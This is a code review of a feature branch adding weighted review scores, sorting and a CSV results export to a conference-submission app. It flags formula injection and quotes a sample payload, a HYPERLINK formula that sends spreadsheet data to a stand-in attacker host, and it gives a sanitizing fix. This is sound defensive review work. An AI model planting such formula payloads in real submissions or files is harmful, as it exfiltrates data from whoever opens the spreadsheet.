# Code Review: MRQ-109 — Chair results: weighted aggregates, sort, real export, progress

Reviewer: independent (cold context). Worktree: `Marquee-worktrees/mrq-109-chair-results` @ `c0c83f2`.

**Checks I ran myself:**

| Check | Result |
|---|---|
| `npx tsc --noEmit` | clean |
| `npx vitest run tests/unit/review-aggregate.MRQ-109.test.ts tests/integration/api/review-results.MRQ-109.test.ts tests/integration/api/submissions-list.test.ts` | **17 passed / 3 files**, 29.8s (under load avg 244) |
| `npm run check:api` | `findings: []`, `notices: []` — new route is registered and CLI/spec parity holds |
| `npm run check:speed` | **not run** — 1-min load average was 244; a measurement here would be noise (see Issue 8) |

---

## 1. Verdict

**FAIL (implementation-level)**

The plan is sound and the core of it is correctly built — the weighted aggregate, the bidirectional sort with nulls-last, the real results export, and the committee rollup all work and are proven by tests I ran. Three concrete, small defects need fixing before merge: a CSV formula-injection vector in a file whose entire purpose is to be opened in a spreadsheet, a committee-card fallback that does not implement the plan's own authoritative Cycle-1 resolution #4, and an internal link that hard-reloads the SPA. None of these are design problems; all are ~10-line fixes.

## 2. Summary

Reviewed the full MRQ-109 diff: a new `src/lib/review-aggregate.ts` emitting one correlated-SQL definition of a submission's score, a new `src/routes/evaluation-results.routes.ts` CSV export, `nullsLast` ordering in `src/api/pagination.ts`, `score_asc` threaded through the sort registry / saved-view schemas / OpenAPI list-item schema, a sortable score header plus reviewer-count line in `SubmissionsPage.tsx`, and per-reviewer progress on the evaluation page's committee card.

Quality is high. The weighted-mean SQL is genuinely correct (I traced the `json_each(...).type` filter, the `weight_pct > 0` guard, the `abstained = 0` exclusion, and the `CASE WHEN criteria_scores IS NULL` guard against `json_each(NULL)`), and the "screen and file agree" assertion in the integration test is exactly the right test to have written. I also verified forward-compatibility against the parent branch `mrq-108-review-depth`: its reviewer UI keys `criteria_scores` by `criterion.id` and writes numeric criteria as JS numbers (`ReviewerPage.tsx:461` → `setCriterion(criterion.id, step)`), so `element.type IN ('integer','real')` will see real integers and select/text criteria will correctly drop out of both numerator and denominator after the rebase. The independence claim in the plan holds.

Key finding: the new export builds its own third copy of CSV quoting and, like the two existing copies, does not neutralize leading `=`/`+`/`-`/`@`. Submission titles come from the public CFP form.

## 3. Issues

**[MAJOR] src/routes/evaluation-results.routes.ts:105 — CSV formula injection in the one export designed to be opened in a spreadsheet**

`csvCell` quotes and doubles `"` but does nothing about a cell whose text begins with `=`, `+`, `-`, `@`, tab, or CR. `Title`, `Speakers`, and `Tracks` are all attacker-controlled: a speaker submitting through the public CFP form can name a talk `=HYPERLINK("http://attacker.example/?"&A1,"Click for details")` and the chair who opens `review-results.csv` in Excel or Sheets executes it. This route's stated purpose (file header comment, and ABS-13's manual step "open the file") is precisely that a human opens it in a spreadsheet, which makes the exposure concrete rather than theoretical. The two pre-existing exports (`review.routes.ts:715` `csv()`, `SubmissionsPage.tsx:568` `csvCell`) share the gap, so this is a repo-wide pattern — but this route is new code and should not add a third instance of it.

**Fix:** prefix a `'` (or a leading tab, whichever the project prefers) when the rendered text starts with `=+-@`, CR, or LF, inside the quoted cell:
```ts
function csvCell(value: string | number | null): string {
  const text = value === null ? "" : String(value);
  const safe = /^[=+\-@\t\r]/.test(text) ? `'${text}` : text;
  return `"${safe.replaceAll('"', '""').replaceAll("\n", " ").replaceAll("\r", " ")}"`;
}
```
Best done as a shared helper (see Issue 5) so the two existing exports inherit the fix.

---

**[MAJOR] src/ui/evaluation/EvaluationPage.tsx:327-330 — `—/—` conflates "fetch failed" with "reviewer has no assignments", and the tooltip contradicts it**

The card renders:
```tsx
const rolled = reviewerProgress?.get(member.id);
if (!rolled) return "—/—";
```
`reviewerProgress` is `null` only when the assignments fetch threw; a *successful* fetch that simply has no rows for this reviewer (the entire committee, any time before "Distribute assignments" has been run for round 1) also lands in the `!rolled` branch and prints `—/—`. That reads as "broken", not "nothing assigned yet". The correct render there is `0/0`.

Compounding it, the `title` is hardcoded to `"Reviews submitted of reviews assigned in this round"` on every branch — so on a genuine fetch failure the tooltip actively lies about what the em dashes mean. Plan-Review Cycle 1 resolution #4 is marked AUTHORITATIVE and specifies `title="Progress unavailable"` for that state; it was not implemented.

**Fix:** distinguish the two states and move the title with them:
```tsx
{(() => {
  if (!reviewerProgress) return <span class="tabular subtle reviewer-progress" title="Progress unavailable">—/— reviewed</span>;
  const rolled = reviewerProgress.get(member.id) ?? { assigned: 0, reviewed: 0 };
  return <span class="tabular subtle reviewer-progress" title="Reviews submitted of reviews assigned in this round">{rolled.reviewed}/{rolled.assigned} reviewed</span>;
})()}
```
(I confirmed the rest of this item is correct: `member.id` really is `person.id` — `evaluation.routes.ts:286` spreads `PersonRow` from `reviewersForCommittee` — so the map key matches `reviewer_person_id`, and every mutation path calls `load()`, so the card refreshes after distribution.)

---

**[MAJOR] src/ui/evaluation/EvaluationPage.tsx:292 — "View results →" hard-reloads the SPA**

```tsx
<a class="button primary" href="/submissions?sort=score">View results →</a>
```
`useBrowserRouter` (`src/ui/shell/router.ts`) has no global click interception — it only listens for `popstate`. Every other internal link in the app pairs the `href` with `onClick={(e) => { e.preventDefault(); navigate(...) }}` (`Sidebar.tsx:10-11`, `ApiTokensPage.tsx:191`, `SubmissionsPage.tsx:190`, `DashboardPage.tsx:60`). This one does not, so the flagship "prominent link into the results table" is the slowest transition in the product: full document teardown, bundle re-parse, cold list fetch. Under R7 ("speed is a feature; treat any slow transition as a defect") that is the wrong first impression on the exact path ABS-10's judge walks.

`EvaluationPage` currently takes no `navigate` prop, which is why the shortcut was taken — but `AppShell.tsx:157` already has `navigate` in scope and passes it to `SubmissionsPage` one line above.

**Fix:** add `navigate` to `EvaluationPageProps`, pass it at `AppShell.tsx:157` (`<EvaluationPage navigate={navigate} />`), and wire the link the way the rest of the codebase does. Keep the `href` for middle-click/open-in-new-tab.

---

**[MINOR] src/routes/evaluation-results.routes.ts:105 — third independent copy of CSV quoting**

`csvCell` here is byte-for-byte the same logic as `csv()` at `review.routes.ts:715` and `csvCell` in `SubmissionsPage.tsx`. The ticket's own premise is "one shared helper; every consumer reads it" — that discipline was applied rigorously to the aggregate and then not to the serializer sitting next to it.

**Fix:** hoist one `csvCell`/`csvRow` into `src/lib/` (alongside `review-aggregate.ts`) and have all three call sites import it. This also makes the Issue-1 fix land everywhere at once.

---

**[MINOR] src/ui/submissions/SubmissionsPage.tsx:568 — the client-side "Export" still headers the column `Score`**

The registry label is now "Weighted score" and the value in that column is now the weighted aggregate, but the older client-side export still writes `"Score"`. Two CSVs from the same page now disagree about what the same number is called.

**Fix:** change the literal to `"Weighted score"` (and consider adding the `Score basis` column, or leave a one-line comment pointing at the results export as the authoritative artifact).

---

**[MINOR] src/lib/review-aggregate.ts:57 — `score_is_weighted` is "any", so a mixed-basis mean is labelled "Weighted"**

`COALESCE(MAX(CASE WHEN value IS NOT NULL THEN weighted END), 0)` sets the flag when *at least one* contributor was criteria-derived. A submission with one scorecard review and two pre-criteria scalar reviews therefore renders as "Weighted by the round's criterion weights" for a number that is a mean of two different bases. This matches the plan's stated contract, so it is not a deviation — but the ticket's whole theme is not lying about what the number is, and this is the one place the label overstates.

**Fix (optional, cheap):** emit `MIN(...)` alongside `MAX(...)` and render a third basis — "Mixed — some reviews predate this round's criteria" — when they disagree. If that is out of scope, note the limitation in the JSDoc so the next reader does not assume "weighted" means "wholly weighted".

---

**[MINOR] src/lib/review-aggregate.ts:47 — `review_count` under-reports when a reviewer submits no number**

`COUNT(contribution.value)` counts only rows with a non-null value. `review.routes.ts` allows `score` and `criteria_scores` to both be null (the default round instructions literally say "Numeric scoring is optional"), so three reviewers can review a submission and the UI will say "1 review". A chair reading "1 review" under a score and deciding it needs more coverage would be acting on a false signal.

**Fix:** either return both counts (`scored_count` for the line under the score, `review_count` for coverage), or relabel to `1 scored review` / `No scored reviews` in `reviewCountLabel` so the number is honest about what it counts.

---

**[MINOR] src/ui/submissions/SubmissionsPage.tsx:210, submissions.css:78 — the `*` basis marker has no legend and no accessible name**

`scoreBasisLabel` is attached only as a `title` on a non-interactive `<span>`. `title` on a `<span>` is not reliably announced by screen readers, and it is invisible in a screenshot — which matters because ABS-04/ABS-13 are scored from screenshots and an opened file. A chair sees `4.00*` with nothing on screen explaining the asterisk. The plan's own text promised `title`/`aria-label`.

**Fix:** add `aria-label` alongside `title` on the score span (or wrap the marker in `<abbr>`), and consider a one-line footnote under the table when any visible row is unweighted.

---

**[MINOR] src/ui/submissions/submissions.css:74 — `.score-col` at 104px will likely wrap "WEIGHTED SCORE"**

`th` is `600 9px/1.2 var(--mono)`, `text-transform: uppercase`, `letter-spacing: .12em`, `padding: 9px 10px` → ~84px of content box. "WEIGHTED SCORE" is 14 mono glyphs plus tracking (~90px) plus the 10px sort glyph and 4px gap. That overflows, so the header cell wraps to two lines and the whole `thead` grows. This is a static change, not a jump, so it does not violate the "elements never jump" rule — but it is a visible deviation from the binding prototype and I could not confirm it without rendering.

**Fix:** widen `.score-col` to ~124px, or shorten the glyph gap, or check it in the browser and close this out with a screenshot.

---

**[MINOR] src/routes/evaluation-results.routes.ts:56,79,110 — the export is plan-scoped in its columns and event-scoped in its data**

`criterionColumns` filters by `round.plan_id = planId`, but `criterionMeans`, `recommendationTallies`, and `allResultRows` (via `listSubmissions`) all key on `eventId` only. On an event with a second evaluation plan, evaluations from the other plan's rounds would fold into the aggregate, the reviewer count, and the recommendation tally, while the per-criterion columns show only this plan's criteria. Harmless today (one plan per event in practice) and the aggregate has the same event-wide scope on the list page, so screen and file still agree — but the mismatch is latent.

**Fix:** either scope the three data queries to the plan's rounds, or add a comment stating that the aggregate is deliberately event-wide (all plans, all rounds) and only the criterion columns are plan-scoped.

---

**[MINOR] src/lib/review-aggregate.ts:26,44 — `submissionRef` is interpolated into SQL with no stated contract**

`reviewAggregateColumns(submissionRef)` string-interpolates its argument. It is only ever called with the constant `"s.id"`, so there is no live vulnerability, but the signature invites a future caller to pass something derived from a request. `resolveSort` in `pagination.ts` documents exactly this constraint ("SQL identifier — only ever an endpoint-owned constant"); this module should too.

**Fix:** one JSDoc line on the parameter: `@param submissionRef SQL identifier — only ever a query-owned constant, never request data.`

---

**[MINOR] process — no validation evidence recorded on the task**

The plan's Validation section committed to `npx vite dev` + the c11 embedded browser: clicking the header both ways, following "View results →", downloading and **opening** the CSV, and reading the committee card before/after, attached with `--role validation`. The task event log (`task_01KZTCRCY1MTXTAWFVAEEXE7AZ.jsonl`) shows `in_progress → review` with no validation artifact. ABS-10 and ABS-13 are scored by a human on a screenshot and an opened file; green tests do not substitute (and Issues 3, 7 and 8 above are all things a browser pass would have surfaced immediately).

**Fix:** run the promised pass and attach the evidence before this leaves review.

---

**[MINOR/UNVERIFIED] performance — one correlated `AVG` became three, each with a `json_each` + join**

`ITEM_SELECT` previously ran a single `AVG(evaluation.score)` correlated subquery per row. It now runs `contributingRows` three times (score, count, basis), each opening `json_each(criteria_scores)` and joining `rubric_criteria`, and SQLite may re-evaluate the aliased `score` again for `ORDER BY score IS NULL ASC, score DESC`. At ~150 evaluations this is almost certainly fine, and the plan names the mitigation (an index on `evaluations(submission_id)`, gated behind a migration-number handshake with T-B). I did not measure: the 1-minute load average was 244, so `check:speed` would have produced a meaningless number.

**Fix:** run `npm run check:speed` once the machine is quiet and record the delta. If it moves, the three subqueries can be collapsed into a single correlated subquery returning a JSON object, or a lateral-style CTE, before reaching for an index.

## 4. Positive Observations

- **The aggregate SQL is genuinely correct, and correct for the right reasons.** Using `json_each`'s own `type` column rather than `json_type(je.value)` (Cycle-1 resolution #1) avoids mis-typing numeric-looking strings; dropping non-numeric criteria from numerator *and* denominator keeps the normalization honest; `weight_pct > 0` and `NULLIF(SUM(...), 0)` both guard the divide; `CASE WHEN criteria_scores IS NULL` guards `json_each(NULL)`. I checked the write path too — `migrations/0001_init.sql:525` enforces `json_valid`, and `review.routes.ts` only ever stores an object of scalars — so this cannot be handed malformed JSON and take the whole submissions list down with it.
- **The forward-compatibility claim is real, not aspirational.** I read the parent branch: `mrq-108-review-depth` keys `criteria_scores` by criterion id and writes numeric criteria as JS numbers, so after the rebase this helper immediately sees `integer`/`real` elements and correctly excludes the new `select`/`text` kinds — with zero changes to either side. Deliberately not reading `rubric_criteria.kind` was the right call.
- **`nullsLast` was the non-obvious insight that makes ABS-10 actually pass.** A naive `ORDER BY score ASC` would have buried the two reviewed submissions under ~200 unscored rows and produced a screenshot showing nothing. Recognising that from the seed's shape, generalising it as one optional field on `SortColumn`, and unit-testing the emitted clause both directions is exactly the standard of care this ticket needed.
- **`SUBMISSION_SORTS` was traced to its real blast radius.** Adding a sort key means `views.routes.ts` (both enums), `saved-views.ts`, the `SavedView` type in `SubmissionsPage.tsx`, and the OpenAPI `submissionListItemSchema` — every one of them updated, and `check:api` comes back with zero findings as a result. That is the failure mode (a chair sorts ascending, clicks "Save view", eats a 422) that usually escapes to production.
- **The "screen and file agree" test is the right test.** Comparing the CSV cells against the live list payload *in the same test*, rather than asserting each against a literal, is what actually holds the one-definition promise over time — and it is the assertion that would break first if someone later forked the aggregate.
- **The refusal to wire `/rounds/{id}/export` is the correct product judgment**, and it is documented in the new file's header comment rather than left as tribal knowledge. A button that produces a plausible-looking file with zero scores is worse than no button.
- **House rules were followed without being asked twice:** fixed-width sort glyph, width-reserved `.results-export-slot` so the toolbar does not shift when the plan id resolves, a never-omitted reviewer-count line so rows do not change height, tabular numerals on the progress span, and `aria-sort` on the sortable header.
